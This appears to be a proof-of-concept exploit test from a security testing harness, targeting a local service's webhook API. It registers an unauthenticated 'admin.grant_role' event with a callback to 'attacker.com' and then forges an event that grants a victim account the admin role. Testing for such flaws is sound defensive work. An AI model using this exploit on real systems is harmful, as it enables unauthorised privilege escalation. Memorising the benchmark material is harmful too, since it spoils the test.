"""PoC: Forged webhook event type injection (CWE-346)."""
from mosaic.oracle.exploit import ExploitTest


class WebhookForgeExploit(ExploitTest):
    def __init__(self, base_url="http://localhost:39120"):
        super().__init__(base_url)

    @property
    def chain_id(self):
        return "express_webhook_event_type_trust"

    def setup(self):
        pass

    def execute(self):
        evidence = []
        # Register a custom privileged event type
        reg_resp = self.http_post("/v1/webhooks/register", json={
            "event_type": "admin.grant_role",
            "callback_url": "http://attacker.com/collect"
        })
        if reg_resp.status_code == 201:
            evidence.append("Registered admin.grant_role event type without auth")
            # Now trigger the forged event
            trigger_resp = self.http_post("/v1/webhooks/events", json={
                "event_type": "admin.grant_role",
                "data": {"user_id": "victim", "role": "admin"},
                "timestamp": "2024-01-01T00:00:00Z"
            })
            if trigger_resp.status_code == 200:
                evidence.append("Forged admin.grant_role event processed successfully")
                return True, "CWE-346 Unauthenticated webhook event registration allows forged privileged events. " + " | ".join(evidence)
            evidence.append(f"Event trigger returned {trigger_resp.status_code}")
        else:
            evidence.append(f"Registration returned {reg_resp.status_code}")
        return False, "Webhook forgery not confirmed. " + " | ".join(evidence)
